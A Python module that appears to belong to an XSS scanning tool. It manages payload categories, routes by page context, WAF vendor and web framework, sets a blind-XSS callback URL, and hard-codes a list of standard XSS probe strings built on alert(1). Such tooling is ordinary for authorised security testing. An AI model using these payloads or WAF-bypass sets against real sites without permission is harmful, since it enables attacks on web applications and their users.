#!/usr/bin/env python3

"""
Payload Manager

Central manager for the XSS payload library.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Dict, Optional
import random
from .basic_xss import BasicXSSPayloads
from .advanced_xss import AdvancedXSSPayloads
from .context_specific import ContextSpecificPayloads
from .waf_bypass import WAFBypassPayloads
from .dom_xss import DOMXSSPayloads
from .filter_evasion import FilterEvasionPayloads
from .encoding_payloads import EncodingPayloads
from .polyglot_payloads import PolyglotPayloads
from .blind_xss import BlindXSSPayloads
from .framework_specific import FrameworkSpecificPayloads


class PayloadManager:
    """Central payload manager for the BRS-XSS payload library"""
    
    def __init__(self):
        self.categories = {
            'basic': BasicXSSPayloads,
            'advanced': AdvancedXSSPayloads,
            'context_specific': ContextSpecificPayloads,
            'waf_bypass': WAFBypassPayloads,
            'dom_xss': DOMXSSPayloads,
            'filter_evasion': FilterEvasionPayloads,
            'encoding': EncodingPayloads,
            'polyglot': PolyglotPayloads,
            'blind_xss': BlindXSSPayloads,
            'framework_specific': FrameworkSpecificPayloads
        }
    
    def get_all_payloads(self) -> List[str]:
        """Get all payloads from all categories"""
        all_payloads = []
        for category_name, category_class in self.categories.items():
            if category_name == 'blind_xss':
                # Blind XSS needs callback URL
                all_payloads.extend(category_class.get_all("https://brs-xss.callback.com"))
            else:
                all_payloads.extend(category_class.get_all())
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        return unique_payloads
    
    def get_category_payloads(self, category: str, **kwargs) -> List[str]:
        """Get payloads from a specific category"""
        if category not in self.categories:
            raise ValueError(f"Unknown category: {category}. Available: {list(self.categories.keys())}")
        
        category_class = self.categories[category]
        
        if category == 'blind_xss':
            callback_url = kwargs.get('callback_url', 'https://brs-xss.callback.com')
            return category_class.get_all(callback_url)
        else:
            return category_class.get_all()
    
    def get_random_payloads(self, count: int = 50, categories: Optional[List[str]] = None) -> List[str]:
        """Get random payloads from specified categories or all categories"""
        if categories:
            payloads = []
            for category in categories:
                payloads.extend(self.get_category_payloads(category))
        else:
            payloads = self.get_all_payloads()
        
        if count >= len(payloads):
            return payloads
        
        return random.sample(payloads, count)
    
    def get_context_payloads(self, context: str) -> List[str]:
        """Get payloads suitable for a specific context"""
        context = context.lower()
        
        if context in ['html', 'html_content']:
            return (BasicXSSPayloads.get_script_payloads() + 
                   BasicXSSPayloads.get_img_payloads() + 
                   BasicXSSPayloads.get_svg_payloads() +
                   ContextSpecificPayloads.get_html_attribute_payloads())
        
        elif context in ['js', 'javascript', 'script']:
            return (AdvancedXSSPayloads.get_obfuscated_payloads() +
                   ContextSpecificPayloads.get_javascript_string_payloads() +
                   ContextSpecificPayloads.get_javascript_variable_payloads())
        
        elif context in ['attr', 'attribute', 'html_attribute']:
            return ContextSpecificPayloads.get_html_attribute_payloads()
        
        elif context in ['url', 'href']:
            return ContextSpecificPayloads.get_url_context_payloads()
        
        elif context in ['css', 'style']:
            return ContextSpecificPayloads.get_css_context_payloads()
        
        elif context in ['dom']:
            return DOMXSSPayloads.get_all()
        
        elif context in ['comment']:
            return ContextSpecificPayloads.get_comment_context_payloads()
        
        else:
            # Return polyglot payloads for unknown contexts
            return PolyglotPayloads.get_context_agnostic_polyglots()
    
    def get_waf_bypass_payloads(self, waf_type: Optional[str] = None) -> List[str]:
        """Get WAF bypass payloads for a specific WAF or all WAFs"""
        if not waf_type:
            return WAFBypassPayloads.get_all()
        
        waf_type = waf_type.lower()
        
        if waf_type in ['cloudflare', 'cf']:
            return WAFBypassPayloads.get_cloudflare_bypass()
        elif waf_type in ['akamai']:
            return WAFBypassPayloads.get_akamai_bypass()
        elif waf_type in ['imperva', 'incapsula']:
            return WAFBypassPayloads.get_imperva_bypass()
        elif waf_type in ['aws', 'aws_waf']:
            return WAFBypassPayloads.get_aws_waf_bypass()
        elif waf_type in ['f5', 'f5_asm']:
            return WAFBypassPayloads.get_f5_asm_bypass()
        elif waf_type in ['sucuri']:
            return WAFBypassPayloads.get_sucuri_bypass()
        elif waf_type in ['modsecurity', 'mod_security']:
            return WAFBypassPayloads.get_modsecurity_bypass()
        else:
            return WAFBypassPayloads.get_all()
    
    def get_framework_payloads(self, framework: str) -> List[str]:
        """Get payloads for a specific framework"""
        framework = framework.lower()
        
        if framework in ['angular', 'angularjs']:
            return FrameworkSpecificPayloads.get_angular_payloads()
        elif framework in ['react', 'reactjs']:
            return FrameworkSpecificPayloads.get_react_payloads()
        elif framework in ['vue', 'vuejs']:
            return FrameworkSpecificPayloads.get_vue_payloads()
        elif framework in ['jquery']:
            return FrameworkSpecificPayloads.get_jquery_payloads()
        elif framework in ['wordpress', 'wp']:
            return FrameworkSpecificPayloads.get_wordpress_payloads()
        elif framework in ['drupal']:
            return FrameworkSpecificPayloads.get_drupal_payloads()
        elif framework in ['flask', 'jinja2']:
            return FrameworkSpecificPayloads.get_flask_jinja2_payloads()
        elif framework in ['django']:
            return FrameworkSpecificPayloads.get_django_payloads()
        elif framework in ['laravel', 'php']:
            return FrameworkSpecificPayloads.get_laravel_payloads()
        else:
            return FrameworkSpecificPayloads.get_all()
    
    def get_payload_statistics(self) -> Dict[str, int]:
        """Get statistics about payload counts per category"""
        stats = {}
        total = 0
        
        for category_name, category_class in self.categories.items():
            if category_name == 'blind_xss':
                count = len(category_class.get_all("https://example.com"))
            else:
                count = len(category_class.get_all())
            
            stats[category_name] = count
            total += count
        
        stats['total_unique'] = len(self.get_all_payloads())
        stats['total_with_duplicates'] = total
        
        return stats
    
    def search_payloads(self, search_term: str, case_sensitive: bool = False) -> List[str]:
        """Search for payloads containing a specific term"""
        all_payloads = self.get_all_payloads()
        
        if not case_sensitive:
            search_term = search_term.lower()
            return [payload for payload in all_payloads 
                   if search_term in payload.lower()]
        else:
            return [payload for payload in all_payloads 
                   if search_term in payload]
    
    def get_top_payloads(self, count: int = 20) -> List[str]:
        """Get the most effective/common XSS payloads"""
        # Hand-picked most effective payloads
        top_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            '\';alert(1);//',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>eval("alert(1)")</script>',
            '<script>prompt(1)</script>',
            'javascript:alert(1)',
            '<script>confirm(1)</script>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<script>setTimeout("alert(1)",0)</script>',
            '<script>Function("alert(1)")()</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
        ]
        
        # Add polyglots and payloads
        top_payloads.extend([
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
            '{{constructor.constructor(\'alert(1)\')()}}',
            '<script>alert`1`</script>',
            '" onmouseover="alert(1)" "',
            '<ScRiPt>alert(1)</ScRiPt>',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>',
            'data:text/html,<script>alert(1)</script>',
            '<svg/onload=alert(1)>',
            '<img/src=x/onerror=alert(1)>',
        ])
        
        return top_payloads[:count]
    
    def get_available_categories(self) -> List[str]:
        """Get list of available payload categories"""
        return list(self.categories.keys())
    
    def validate_payload(self, payload: str) -> Dict[str, bool]:
        """Basic validation of a payload"""
        validation = {
            'has_script_tag': '<script' in payload.lower(),
            'has_event_handler': any(event in payload.lower() for event in 
                                   ['onclick', 'onload', 'onerror', 'onmouseover', 
                                    'onfocus', 'onblur', 'onchange']),
            'has_javascript_protocol': 'javascript:' in payload.lower(),
            'has_data_uri': 'data:' in payload.lower(),
            'has_eval': 'eval(' in payload.lower(),
            'has_alert': 'alert(' in payload.lower(),
            'potentially_dangerous': any(danger in payload.lower() for danger in
                                       ['document.cookie', 'document.domain', 
                                        'location.href', 'window.location']),
        }
        
        return validation